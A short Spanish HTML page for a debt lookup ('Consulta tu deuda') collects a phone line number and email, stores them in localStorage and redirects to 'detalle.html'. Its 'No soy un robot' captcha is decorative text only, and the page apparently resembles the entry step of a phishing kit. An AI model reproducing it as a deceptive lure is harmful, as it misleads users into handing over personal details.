<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Formulario de Pago</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: white;
      text-align: center;
      padding: 20px;
    }

    form {
      background-color: #f9f9f9;
      display: inline-block;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 100%;
    }

    input[type="text"],
    input[type="email"] {
      width: 95%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 16px;
    }

    button {
      background-color: #007bff;
      color: white;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
    }

    button:hover {
      background-color: #0056b3;
    }

    .captcha {
      margin-top: 15px;
      font-size: 14px;
      color: #666;
    }

    img {
      width: 100%;
      max-width: 1000px;
    }
  </style>
</head>
<body>
  <img src="ban.jpeg" alt="banner">
  <br><br>

  <form id="pagoForm">
    <h2>Consulta tu deuda</h2>
    <input type="text" name="numero" id="numero" placeholder="Número de línea" required>
    <input type="email" name="email" id="email" placeholder="Correo electrónico" required>
    <div class="captcha">🔒 No soy un robot</div>
    <br><br>
    <button type="submit">Consultar</button>
  </form>

  <br><br>
  <img src="pa.jpeg" alt="decoración">
  <img src="nu.jpeg" alt="decoración">
  <img src="pre.jpeg" alt="decoración">
  <img src="fin.jpeg" alt="decoración">

  <script>
    document.getElementById('pagoForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const numero = document.getElementById('numero').value.trim();
      const email = document.getElementById('email').value.trim();

      localStorage.setItem('numero', numero);
      localStorage.setItem('email', email);

      window.location.href = 'detalle.html';
    });
  </script>
</body>
</html>
